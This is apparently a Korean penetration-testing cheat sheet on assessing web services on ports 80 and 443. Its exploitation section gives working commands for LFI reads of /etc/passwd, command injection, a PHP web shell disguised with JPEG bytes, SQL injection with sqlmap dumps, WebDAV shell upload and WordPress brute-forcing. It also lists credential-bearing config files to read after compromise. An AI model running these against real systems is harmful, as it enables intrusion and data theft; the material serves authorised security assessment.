---
sidebar_position: 17
title: HTTP/HTTPS (Port 80/443)
---

# HTTP/HTTPS (Port 80/443) 취약점 진단

## Overview

**HTTP/HTTPS**: 웹 서비스 통신 프로토콜. 다양한 공격 벡터가 존재하여 가장 복잡하고 중요한 진단 대상

**공격 마인드셋 (Source & Sink)**:
- **Source (입력 지점)**: GET/POST 파라미터, 쿠키, HTTP 헤더, API 바디, 파일 업로드 등 사용자 입력 가능 영역 파악
- **Sink (사용 지점)**: DB 쿼리, 시스템 명령어, 파일 시스템, 외부 API 등 입력값 처리 지점 파악
- **핵심 질문**: 입력값 통제 가능 여부, 필터링 유무, 페이로드 실행 가능성 분석

---

## Assessment Checklist

- [ ] **웹 서버/프레임워크 스택 식별**: 사용하는 서버(Nginx, Apache), 프레임워크(Spring, PHP), CMS(WordPress) 종류 및 구버전 여부 점검
- [ ] **크롤링/숨김 디렉토리 스캔**: `robots.txt` 및 디렉토리 브루트포싱을 통한 관리자 페이지, 백업 파일 노출 점검
- [ ] **주요 웹 취약점 존재 여부**: SQL 인젝션, LFI, Command Injection, 파일 업로드 취약점 등 OWASP Top 10 기반 점검
- [ ] **WebDAV 설정 결함**: 불필요한 WebDAV 활성화 및 파일 쓰기(PUT) 허용 여부 점검

---

## 1. Reconnaissance

### 웹 서버 및 기술 스택 확인
```bash
# Nmap HTTP 관련 스크립트 스캔
nmap -p 80,443 -sV --script http-title,http-headers,http-enum <target>

# cURL을 이용한 헤더 정보 획득
curl -I http://<target>

# WhatWeb을 이용한 상세 기술 스택 식별
whatweb http://<target>
```

### 크롤러 접근 규칙 및 숨김 경로 확인
```bash
# robots.txt 내용 확인 (크롤링 차단된 관리자/백업 디렉토리 탐색)
curl http://<target>/robots.txt
```

### 디렉토리 브루트포싱 (Directory Enumeration)
```bash
# ffuf를 이용한 디렉토리 스캔 (추천)
ffuf -u http://<target>/FUZZ -w /usr/share/wordlists/dirb/common.txt -mc 200,301,302

# 파일 확장자 지정 스캔
ffuf -u http://<target>/FUZZ -w /usr/share/wordlists/dirb/common.txt -e .php,.txt,.html,.bak

# Gobuster를 이용한 스캔
gobuster dir -u http://<target>/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,zip,bak
```

---

## 2. Exploitation

### 주요 웹 취약점 테스트 (Web Vulnerabilities)

**LFI (Local File Inclusion)**
```bash
# 기본 LFI 테스트 (URL 인코딩 및 널 바이트 활용)
curl "http://<target>/page.php?file=../../../../etc/passwd"
curl "http://<target>/page.php?file=../../../../etc/passwd%00"

# LFImap 자동화 도구 활용
python3 lfimap.py -U "http://<target>/page.php?file=test" -a
```

**Command Injection**
```bash
# OS 명령어 연산자 및 URL 인코딩 주입 테스트
# ; ( %3B ), | ( %7C ), && ( %26%26 )
curl "http://<target>/ping.php?ip=127.0.0.1%3B+whoami"
```

**파일 업로드 우회 (File Upload Bypass)**
```bash
# 1. 파일 확장자 우회: shell.php.jpg, shell.php%00.jpg, shell.pHp
# 2. Content-Type 변조 (Burp Suite 활용): image/jpeg 로 조작
# 3. 매직 바이트(Magic Byte) 추가 결합
echo -e "\xFF\xD8\xFF\xE0<?php system(\$_GET['cmd']); ?>" > shell.php
```

**SQL Injection**
```bash
# 기본 수동 페이로드 주입
curl "http://<target>/login.php" -d "username=admin'--&password=a"

# SQLMap을 이용한 데이터베이스 자동 열거 및 덤프
sqlmap -u "http://<target>/page.php?id=1" --dbs
sqlmap -u "http://<target>/page.php?id=1" -D <database> -T <table> --dump
```

### WebDAV 취약점 테스트
```bash
# davtest를 이용한 WebDAV 업로드 가능 여부 자동 진단
davtest -url http://<target>/webdav/

# cadaver를 이용한 수동 연결 및 파일 업로드
cadaver http://<target>/webdav/
dav:/webdav/> put shell.php
```

### CMS 전용 취약점 진단 (WordPress)
```bash
# WPScan을 이용한 사용자, 테마, 플러그인 열거
wpscan --url http://<target> --enumerate p,t,u

# 계정 브루트포스 공격
wpscan --url http://<target> --usernames admin --passwords /usr/share/wordlists/rockyou.txt
```

---

## 3. Advanced Techniques

### 간이 웹 서버 구동 (Payload Delivery)
타겟 서버로 익스플로잇 페이로드를 넘겨주기 위한 로컬 웹 서버 임시 구동
```bash
# Python 3 내장 HTTP 서버 오픈
python3 -m http.server 80

# PHP 내장 웹 서버 오픈
sudo php -S 0.0.0.0:80 -t /var/www/html
```

### cURL 및 Wget 활용 팁
```bash
# [cURL] 쿠키 포함, POST 데이터 전송 및 리다이렉트 추적
curl -b "session=abc123" -X POST -d "param=value" -L http://<target>

# [Wget] 백그라운드 재귀 다운로드
wget -b -r http://<target>/
```

---

## 4. Post-Exploitation
웹 서버 장악 후 시스템 내부로 권한 확장을 위한 주요 설정 파일 확인

**웹 서버 설정 파일 주요 위치:**
- Apache: `/etc/apache2/apache2.conf`, `/etc/httpd/conf/httpd.conf`
- Nginx: `/etc/nginx/nginx.conf`
- 웹 루트 디렉토리 내 DB 연결 정보: `wp-config.php`, `config.php`, `.env` 파일 등
